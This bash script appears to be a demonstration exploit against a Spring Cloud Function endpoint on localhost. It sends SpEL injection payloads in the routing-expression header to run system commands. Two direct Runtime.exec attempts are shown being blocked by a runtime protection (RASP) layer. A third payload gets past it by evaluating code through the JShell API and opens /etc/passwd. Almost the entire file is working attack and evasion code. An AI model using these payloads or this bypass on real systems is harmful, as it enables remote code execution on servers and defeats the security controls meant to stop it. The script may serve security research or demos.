#!/bin/bash


RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'

echo -e "${RED}----Bypassing RASP using JShell API [JVM ESCAPE] 😈-----------${NC}"

# Attempt 1
echo -e "${GREEN}Attempt 1: Executing command...${NC}"
echo -e "${YELLOW}curl -X POST http://localhost:8080/iamvulnerable -H \"spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('open -e /etc/passwd')\"${NC}"
sleep 1
curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('open -e /etc/passwd')"
echo -e "\n"
sleep 3

echo -e "${RED} We are blocked 😠${NC}"

# Attempt 2
echo -e "${GREEN}Attempt 2: Executing command...${NC}"
echo -e "${YELLOW}curl -X POST http://localhost:8080/iamvulnerable -H \"spring.cloud.function.routing-expression: T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang' + '.Runtime').getMethods()[0].invoke(null).exec('open -e /etc/passwd')\"${NC}"
sleep 1
curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression: T(java.lang.ClassLoader).getSystemClassLoader().loadClass('java.lang' + '.Runtime').getMethods()[0].invoke(null).exec('open -e /etc/passwd')"
echo -e "\n"
sleep 3

echo -e "${RED} We are blocked 😠${NC}"

# Bypass
echo -e "${GREEN}Bypass: Executing command...${NC}"
echo -e "${YELLOW}curl -X POST http://localhost:8080/iamvulnerable -H \"spring.cloud.function.routing-expression: T(jdk.jshell.JShell).create().eval('System.out.println(\"Bypassed RASP - \" + ((Runtime)ClassLoader.getSystemClassLoader().loadClass('java.lang' + '.Runtime').getMethods()[0].invoke(null)).exec('open -e /etc/passwd').toString())')\"${NC}"
sleep 1
curl  -X POST http://localhost:8080/iamvulnerable -H "spring.cloud.function.routing-expression:   T(jdk.jshell.JShell).create().eval('System.out.println(\"Bypassed RASP - \" + ((Runtime)ClassLoader.getSystemClassLoader().loadClass(\"java.lang\" + \".Runtime\").getMethods()[0].invoke(null)).exec(\"open -e /etc/passwd\").toString())')"
